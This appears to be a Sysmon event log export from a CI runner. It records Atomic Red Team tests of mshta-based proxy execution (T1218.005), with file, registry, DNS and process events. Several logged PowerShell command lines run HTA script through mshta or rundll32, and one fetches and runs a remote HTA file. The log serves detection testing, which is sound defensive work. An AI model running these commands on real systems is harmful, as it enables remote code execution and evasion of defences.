"TimeCreated","Id","Message"
"12/17/2025 8:05:15 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:15.824
ProcessGuid: {f995aebf-5f77-6942-cc00-000000000e00}
ProcessId: 5888
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:58 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:58.077
SourceProcessGUID: {f995aebf-641f-6942-7106-000000000e00}
SourceProcessId: 9724
SourceThreadId: 6496
SourceImage: C:\Windows\system32\compattelrunner.exe
TargetProcessGUID: {f995aebf-5f5c-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\SYSTEM32\aeinv.dll+22b55|C:\Windows\SYSTEM32\aeinv.dll+39fa3|C:\Windows\SYSTEM32\aeinv.dll+74d22|C:\Windows\SYSTEM32\aeinv.dll+48f80|C:\Windows\SYSTEM32\aeinv.dll+53228|C:\Windows\SYSTEM32\aeinv.dll+5365c|C:\Windows\system32\compattelrunner.exe+b57e|C:\Windows\system32\compattelrunner.exe+c7fb|C:\Windows\system32\compattelrunner.exe+1f5b|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:39 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 08:04:39.120
ProcessGuid: {f995aebf-5f79-6942-d300-000000000e00}
ProcessId: 7608
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNoticalc
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:33 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:04:31.226
ProcessGuid: {f995aebf-640f-6942-5e06-000000000e00}
ProcessId: 2832
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\regsvr32.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:23.551
ProcessGuid: {f995aebf-6407-6942-5106-000000000e00}
ProcessId: 6904
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nbhljub2.dq5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:23 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:23.533
ProcessGuid: {f995aebf-6407-6942-5106-000000000e00}
ProcessId: 6904
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nbhljub2.dq5.ps1
CreationUtcTime: 2025-12-17 08:04:23.533
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:23.168
ProcessGuid: {f995aebf-6407-6942-4f06-000000000e00}
ProcessId: 8004
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cnzygn0x.osj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:23 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:23.146
ProcessGuid: {f995aebf-6407-6942-4f06-000000000e00}
ProcessId: 8004
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cnzygn0x.osj.ps1
CreationUtcTime: 2025-12-17 08:04:23.146
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:22.775
ProcessGuid: {f995aebf-6406-6942-4d06-000000000e00}
ProcessId: 1796
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qvwemwme.xe5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:22 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:22.755
ProcessGuid: {f995aebf-6406-6942-4d06-000000000e00}
ProcessId: 1796
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qvwemwme.xe5.ps1
CreationUtcTime: 2025-12-17 08:04:22.755
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:22.384
ProcessGuid: {f995aebf-6406-6942-4b06-000000000e00}
ProcessId: 9324
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_3iydx1wo.yfi.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:22 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:22.362
ProcessGuid: {f995aebf-6406-6942-4b06-000000000e00}
ProcessId: 9324
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_3iydx1wo.yfi.ps1
CreationUtcTime: 2025-12-17 08:04:22.362
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:21 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:21.986
ProcessGuid: {f995aebf-6405-6942-4906-000000000e00}
ProcessId: 9008
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ypcwgere.4q2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:21 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:21.964
ProcessGuid: {f995aebf-6405-6942-4906-000000000e00}
ProcessId: 9008
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ypcwgere.4q2.ps1
CreationUtcTime: 2025-12-17 08:04:21.964
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:21 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:21.590
ProcessGuid: {f995aebf-6405-6942-4706-000000000e00}
ProcessId: 5860
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_p2jgqnlv.0zf.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:21 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:21.567
ProcessGuid: {f995aebf-6405-6942-4706-000000000e00}
ProcessId: 5860
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_p2jgqnlv.0zf.ps1
CreationUtcTime: 2025-12-17 08:04:21.567
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:21 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:21.035
ProcessGuid: {f995aebf-6404-6942-4506-000000000e00}
ProcessId: 3628
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_v4tkea24.wav.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:21 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:21.009
ProcessGuid: {f995aebf-6404-6942-4506-000000000e00}
ProcessId: 3628
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_v4tkea24.wav.ps1
CreationUtcTime: 2025-12-17 08:04:21.009
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:18 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:04:18.653
ProcessGuid: {f995aebf-6402-6942-3d06-000000000e00}
ProcessId: 8092
Image: C:\Windows\System32\svchost.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:15.921
ProcessGuid: {f995aebf-63ff-6942-3806-000000000e00}
ProcessId: 4884
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1kti5gvy.jlp.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:15.901
ProcessGuid: {f995aebf-63ff-6942-3806-000000000e00}
ProcessId: 4884
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1kti5gvy.jlp.ps1
CreationUtcTime: 2025-12-17 08:04:15.901
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:14 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 08:04:14.849
ProcessGuid: {f995aebf-5f79-6942-d300-000000000e00}
ProcessId: 7608
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotiT1218.005.hta
Details: DWORD (0x00000004)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:13 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:13.602
ProcessGuid: {f995aebf-63fd-6942-3306-000000000e00}
ProcessId: 1368
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ly4dp5a1.zek.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:13 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:13.577
ProcessGuid: {f995aebf-63fd-6942-3306-000000000e00}
ProcessId: 1368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ly4dp5a1.zek.ps1
CreationUtcTime: 2025-12-17 08:04:13.577
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:13 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:13.483
ProcessGuid: {f995aebf-63fd-6942-3306-000000000e00}
ProcessId: 1368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\system32\mshta.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:12 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:12.953
ProcessGuid: {f995aebf-63fc-6942-3106-000000000e00}
ProcessId: 6512
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pqn1n524.1nu.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:12 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:12.933
ProcessGuid: {f995aebf-63fc-6942-3106-000000000e00}
ProcessId: 6512
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pqn1n524.1nu.ps1
CreationUtcTime: 2025-12-17 08:04:12.933
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:12 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:12.837
ProcessGuid: {f995aebf-63fc-6942-3106-000000000e00}
ProcessId: 6512
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\system32\mshta.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:12 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:12.257
ProcessGuid: {f995aebf-63fc-6942-2d06-000000000e00}
ProcessId: 9776
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_afhuty4h.mp1.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:12 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:12.233
ProcessGuid: {f995aebf-63fc-6942-2d06-000000000e00}
ProcessId: 9776
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_afhuty4h.mp1.ps1
CreationUtcTime: 2025-12-17 08:04:12.233
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:12 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:12.138
ProcessGuid: {f995aebf-63fc-6942-2d06-000000000e00}
ProcessId: 9776
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\system32\rundll32.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:11 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:11.586
ProcessGuid: {f995aebf-63fb-6942-2b06-000000000e00}
ProcessId: 9716
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_f4m00a00.xjz.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:11 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:11.562
ProcessGuid: {f995aebf-63fb-6942-2b06-000000000e00}
ProcessId: 9716
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_f4m00a00.xjz.ps1
CreationUtcTime: 2025-12-17 08:04:11.562
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:11 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:11.475
ProcessGuid: {f995aebf-63fb-6942-2b06-000000000e00}
ProcessId: 9716
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\system32\mshta.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:10 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:10.948
ProcessGuid: {f995aebf-63fa-6942-2906-000000000e00}
ProcessId: 7412
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cdbc4h1p.zv2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:10 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:10.927
ProcessGuid: {f995aebf-63fa-6942-2906-000000000e00}
ProcessId: 7412
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cdbc4h1p.zv2.ps1
CreationUtcTime: 2025-12-17 08:04:10.927
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:10.835
ProcessGuid: {f995aebf-63fa-6942-2906-000000000e00}
ProcessId: 7412
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:10 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:10.325
ProcessGuid: {f995aebf-63fa-6942-2706-000000000e00}
ProcessId: 5364
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_5j3irlp1.n2y.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
